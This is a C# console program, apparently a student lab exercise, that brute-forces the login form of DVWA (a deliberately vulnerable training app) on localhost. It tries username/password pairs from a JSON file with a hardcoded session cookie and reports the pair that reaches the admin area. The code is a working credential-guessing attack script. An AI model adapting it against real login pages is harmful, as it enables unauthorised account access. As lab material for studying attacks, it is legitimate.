using System;
using System.Net;
using System.Web;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Specialized;
using Newtonsoft.Json;
namespace LatypovLab2 
{
    public class Account
    {
        public string log { get; set; }
        public string pass { get; set; }
    }

        class Program
    {
        private static bool findmessage(string Res)
        {
            if (Res.Contains("Welcome to the password protected area admin"))

                return true;
            else
                return false;
        }

        static void Main(string[] args)
        {
           
            

            string path = System.IO.Directory.GetCurrentDirectory()+ "\\1.json";
            string resstring;
            using (StreamReader sr = new StreamReader(path, System.Text.Encoding.Default))
            {
                 resstring = sr.ReadToEnd();
            }
            var pairs = JsonConvert.DeserializeObject<Account[]>(resstring);
            bool found = false;
            string sUrl = "http://localhost/dvwa/vulnerabilities/brute/index.php";
            Cookie cookieXammp = new Cookie("PHPSESSID", "a4k7fo0b95gfobum2ep9f53l8i", "/dvwa", "localhost");
            Cookie cookieDVWA = new Cookie("security", "low", "/dvwa", "localhost");
            foreach (var item in pairs)
            {
                string addition = $"?username={item.log}&password={item.pass}&Login=Login";
                WebRequest request = WebRequest.Create(sUrl+addition);

                request.TryAddCookie(cookieXammp);
                request.TryAddCookie(cookieDVWA);

                WebResponse response = request.GetResponse();
                using (Stream stream = response.GetResponseStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        if (findmessage(reader.ReadToEnd()))
                        {
                            Console.WriteLine($"Login={item.log}, password={item.pass}");
                            found = true;
                            break;

                        }
                    }
                }
                response.Close();
               
                
            }
            if (!found)
            {
                Console.WriteLine("Brute failed");
            }
            else
            {
                Console.WriteLine("Brute Success");
            }
            Console.Read();
        }
    }
    public static class WebRequests //EXCTENTION METHOD FOR WEBREQUEST
    {
        public static bool TryAddCookie(this WebRequest webRequest, Cookie cookie)
        {
            HttpWebRequest httpRequest = webRequest as HttpWebRequest;
            if (httpRequest == null)
            {
                return false;
            }

            if (httpRequest.CookieContainer == null)
            {
                httpRequest.CookieContainer = new CookieContainer();
            }

            httpRequest.CookieContainer.Add(cookie);
            return true;
        }
    }
}
